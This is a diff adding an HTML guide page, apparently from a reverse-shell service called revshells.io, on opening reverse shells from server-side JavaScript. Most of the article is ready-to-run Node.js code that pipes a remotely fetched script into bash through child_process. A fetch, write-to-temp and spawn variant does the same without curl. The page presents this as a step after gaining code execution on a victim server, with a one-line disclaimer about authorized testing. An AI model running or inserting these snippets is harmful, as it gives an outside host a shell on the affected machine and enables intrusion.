@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JavaScript reverse shell callbacks | revshells.io</title>
+<meta name="description" content="JavaScript reverse shell patterns with revshells.io: Node.js child_process bootstrap and server-side fetch triggers for authorized callback testing.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://revshells.io/articles/javascript-reverse-shell">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="revshells.io">
+<meta property="og:title" content="JavaScript reverse shell callbacks | revshells.io">
+<meta property="og:description" content="JavaScript reverse shell patterns with revshells.io: Node.js child_process bootstrap and server-side fetch triggers for authorized callback testing.">
+<meta property="og:url" content="https://revshells.io/articles/javascript-reverse-shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JavaScript reverse shell callbacks | revshells.io">
+<meta name="twitter:description" content="Node.js and SSRF-style JavaScript reverse shell patterns with revshells.io callbacks.">
+<!-- __ANALYTICS_LOCAL__ -->
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="stylesheet" href="/static/common.css">
+</head>
+<body>
+<header class="topbar">
+  <a href="/" class="brand">
+    <div class="brand-logo">rsd</div>
+    <div class="brand-text">
+      <span class="brand-name">revshells.io</span>
+      <span class="brand-version" id="rsd-version">v0.0.0</span>
+    </div>
+  </a>
+  <div class="topbar-actions">
+    <a href="/articles" class="btn">Guides</a>
+    <a href="/" class="btn btn-primary">Create session</a>
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+  </div>
+</header>
+
+<main class="article-main">
+  <h1>JavaScript reverse shell with revshells.io</h1>
+  <p class="article-lead">Browser JavaScript cannot open a raw reverse TCP shell to your laptop. Server-side JavaScript (Node.js, Deno, Electron, SSRF-to-shell gadgets) can spawn a process that pulls your revshells.io bootstrap — same model as bash or Python callbacks.</p>
+
+  <h2>1. Create a session</h2>
+  <p>Create a session at <a href="/">revshells.io</a> and copy the session ID.</p>
+
+  <h2>2. Node.js child_process</h2>
+  <pre>const { exec } = require('child_process');
+exec('curl -fsSL https://revshells.io/SESSION-ID/revshell | bash');</pre>
+  <p>ESM:</p>
+  <pre>import { exec } from 'node:child_process';
+exec('curl -fsSL https://revshells.io/SESSION-ID/nopty | bash');</pre>
+
+  <h2>3. fetch + write + spawn (no curl)</h2>
+  <pre>import { execFile } from 'node:child_process';
+import fs from 'node:fs/promises';
+import os from 'node:os';
+import path from 'node:path';
+
+const res = await fetch('https://revshells.io/SESSION-ID/revshell');
+const body = await res.text();
+const file = path.join(os.tmpdir(), 'rs-bootstrap.sh');
+await fs.writeFile(file, body, { mode: 0o700 });
+execFile('/bin/bash', [file]);</pre>
+
+  <h2>4. Browser vs server-side</h2>
+  <ul>
+    <li><strong>Browser:</strong> use revshells.io as the operator UI only — you do not catch shells in the victim's Chrome tab.</li>
+    <li><strong>Server-side JS:</strong> treat it like any other RCE — run the bootstrap, then attach from the hub.</li>
+  </ul>
+
+  <nav class="article-nav">
+    <a class="btn" href="/articles/python-reverse-shell">← Python guide</a>
+    <a class="btn" href="/articles/msfvenom-alternative">MSFvenom guide →</a>
+  </nav>
+
+  <p class="article-disclaimer">For authorized security testing, CTFs, and lab environments only.</p>
+</main>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script>rsdInitTopbar();</script>
+</body>
+</html>
